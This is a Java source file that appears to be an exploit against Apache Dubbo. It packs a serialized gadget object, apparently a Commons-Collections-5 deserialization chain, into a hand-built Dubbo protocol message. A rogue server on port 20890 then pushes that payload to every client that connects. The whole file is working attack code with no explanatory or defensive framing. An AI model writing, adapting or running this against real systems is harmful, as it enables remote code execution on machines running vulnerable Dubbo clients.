import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Random;
import org.apache.dubbo.common.io.Bytes;
import org.apache.dubbo.common.serialize.Cleanable;


public class Main {
    public static void main(String[] args) throws Exception {

        // header.
        byte[] header = new byte[16];
        // set magic number.
        Bytes.short2bytes((short) 0xdabb, header);
        // set request and serialization flag.
        header[2] = (byte) ((byte) 0x80 | 0x20 | 3);

        // set request id.
        Bytes.long2bytes(new Random().nextInt(100000000), header, 4);

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();

        Object o = CC5.getObj();
        ByteArrayOutputStream readobjByteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream oos =new ObjectOutputStream(readobjByteArrayOutputStream);
        oos.writeByte(1);
        oos.writeObject(o);

        Bytes.int2bytes(readobjByteArrayOutputStream.size(), header, 12);

        byteArrayOutputStream.write(header);
        byteArrayOutputStream.write(readobjByteArrayOutputStream.toByteArray());

        byte[] bytes = byteArrayOutputStream.toByteArray();

        ServerSocket serverSocket = new ServerSocket(20890);

        while(true){
            Socket server = serverSocket.accept();
            System.out.println("Remote ip：" + server.getRemoteSocketAddress());
            DataOutputStream out = new DataOutputStream(server.getOutputStream());
            out.write(bytes);
            out.flush();
            out.close();
            server.close();
        }
    }
}
